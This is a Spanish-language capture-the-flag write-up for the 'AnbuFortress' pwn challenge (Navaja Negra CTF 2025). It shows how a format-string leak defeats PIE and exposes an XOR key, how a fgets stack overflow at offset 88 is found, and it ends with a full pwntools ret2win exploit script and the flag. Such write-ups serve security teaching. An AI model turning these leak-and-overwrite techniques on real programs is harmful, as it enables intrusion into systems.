# AnbuFortress 

> Navaja Negra CTF 2025

> 02/10/2025 09:00 CEST - 04/10/2025 11:00 CEST

* Categoría: Pwn
* Autor: M0nk3st 
* Dificultad: ★★
* Etiquetas: Format String, ret2win

## Descripción

    Debido a los múltiples ataques que hemos recibido el Hokage ha decidido crear nuestro propio sistema de comunicaciones encriptado. No olvide mandarnos su identificador para tenerle en cuenta y no crea que le daremos la clave fácilmente.

## Archivos

    Anbu_Fortress

```
Binario ELF
```

## Resolución

Al analizar el binario en Ghidra observamos que, tras mostrar el banner, `main` invoca una función `info_leak` vulnerable a format string. El problema radica en un `printf` (línea 15) donde se imprime el buffer directamente, sin especificar una cadena de formato. Esta omisión permite al atacante suministrar especificadores como `%p`, `%lx`, etc., provocando filtraciones del stack en tiempo de ejecución y exponiendo direcciones o datos internos del proceso (direcciones de funciones), información que puede resultar crucial para el bypass de mitigaciones y etapas posteriores de explotación.

 ![[images/1.png]]

Después de la ejecución de `info_leak`, el flujo del programa pasa a una función denominada `vulnerable_function`. Tal y como sugiere su nombre, presenta un error crítico en la llamada a `fgets`, ya que se le indica leer un tamaño muy superior al del buffer reservado en la pila. Esta discrepancia permite escribir más allá de los límites de la variable local, provocando un desbordamiento de búfer clásico. Gracias a esta condición es posible sobrescribir datos adyacentes en la pila, incluyendo la dirección de retorno de la función, lo que abre la puerta al control del flujo de ejecución del programa.

![[images/2.png]]

Iniciando la fase de explotación, el primer paso consiste en aprovechar la condición vulnerable generada por el uso de `fgets`, que intenta leer hasta 1000 bytes en un buffer de tan solo 64. Este desajuste permite un buffer overflow en la pila, lo que abre la posibilidad de sobrescribir la dirección de retorno. Para vulnerar este `fgets` de manera controlada, es imprescindible determinar el offset exacto a partir del cual comenzamos a pisar la dirección de retorno. Para ello utilizamos pwndbg con las utilidades `cyclic` y `cyclic -l`. Con `cyclic` generamos un patrón único que, al provocar el crash, nos deja en el registro de instrucción la secuencia que lo causó. Posteriormente, con `cyclic -l` ubicamos la posición de dicha secuencia dentro del patrón, obteniendo el offset preciso. Este valor nos permitirá construir un payload válido para tomar el control del flujo de ejecución.
  
![[images/3.png]]

Nuestro offset es 88.

Una vez identificado el offset, el siguiente paso consiste en obtener un leak de direcciones que nos permita calcular la base del PIE (Position Independent Executable). Para ello aprovechamos la vulnerabilidad de format string presente en la función `info_leak`. Al enviar el especificador `%57$p`, logramos filtrar una dirección de memoria correspondiente a la propia función `main`. Con este valor es posible restar el offset conocido de `main` en el ELF, lo que nos da como resultado la base real en memoria del binario durante la ejecución. Este cálculo es fundamental, ya que al tratarse de un binario compilado con PIE, las direcciones de funciones como `win` cambian en cada ejecución y solo pueden obtenerse a partir de dicha base.

![[images/4.png]]

![[images/5.png]]

De este modo, aunque el PIE varíe en cada ejecución, la distancia entre la dirección de `main` y la de la función objetivo se mantiene constante. Gracias a ello, una vez conocida la base del binario en memoria, podemos calcular en todo momento la dirección exacta de la función `win`.

Sin embargo, durante el desarrollo del solver nos encontramos con un inconveniente: a pesar de que el payload estaba correctamente construido, los saltos no se ejecutaban como esperábamos. El problema residía en el alineamiento de la pila (stack alignment).

En arquitecturas x86_64 (AMD64), tanto el sistema operativo como el ABI (Application Binary Interface) exigen que el puntero de pila (RSP) esté alineado a 16 bytes justo antes de una instrucción `call`. Si esta condición no se cumple, las llamadas a función pueden provocar fallos o comportamientos erráticos.

La solución consiste en insertar un gadget `ret` encontrado con herramientas como ROPgadget. Este gadget ajusta la pila, restableciendo la alineación de 16 bytes, lo que garantiza que las llamadas a funciones (en este caso, la invocación de `win`) se ejecuten de forma estable y sin errores.

![[images/6.png]]

Al acceder a la función `check_key_and_print_flag` observamos que el programa solicita la clave utilizada para cifrar el mensaje. Sin embargo, dicha clave no coincide con la que poseemos, un detalle intencionado que ya se anticipaba en el enunciado del reto. Para resolver este punto recurrimos nuevamente a la vulnerabilidad de format string detectada en `info_leak`, utilizándola para extraer directamente la clave de la operación XOR. Identificar cuál de los valores filtrados corresponde a la clave resulta sencillo, ya que se encuentra siempre en el mismo offset que habíamos verificado previamente en el entorno local, lo que nos permite reutilizarlo de forma confiable en el entorno remoto.

![[images/7.png]]

Y como podemos observar si introducimos `%39$p` obtendremos la key usada para la XOR permitiéndonos así obtener la flag.

```python
from pwn import *
import re

binary = "./Anbu_Fortress"
padding = 88
main_offset = 0x1752   
ret = 0x0000000000001016


p = process(binary)
gdb.attach(p, gdbscript=f'''
b *main
c
''')

main = 0x555555555752
win = 0x555555555209
offset = win - main
print(f"Este es el offset {hex(offset)}")

p.sendlineafter(b"Introduzca su identificador: ", b"%57$p")

output  = p.recvuntil(b"ero", timeout=2).decode(errors="ignore")
output += p.recvline(timeout=2).decode(errors="ignore")
print(f"[DEBUG] Output recibido:\n{output}")

pie_base = 0

m = re.search(r"0x[0-9a-fA-F]+", output)
if m:
    leak = int(m.group(0), 16)
    print(f"[+] Leak guardado: {hex(leak)}")

    pie_base = leak - main_offset
    print(f"[+] Base del PIE: {hex(pie_base)}")

    win_addr = leak + offset
    print(f"[+] Dirección win: {hex(win_addr)}")
else:
    print("[-] No se encontró leak")
    win_addr = 0

new_ret = pie_base + ret
print(f"Este es el nuevo ret_ {hex(new_ret)}")

payload = b"A" * padding + p64(new_ret) +  p64(win_addr)


print(f"[DEBUG] Payload length: {len(payload)}")

p.sendline(payload)

p.interactive()
```

> **flag: nnctf{H1dd3N_L34F_F0rm4t_Str1nG_4tt4ack}**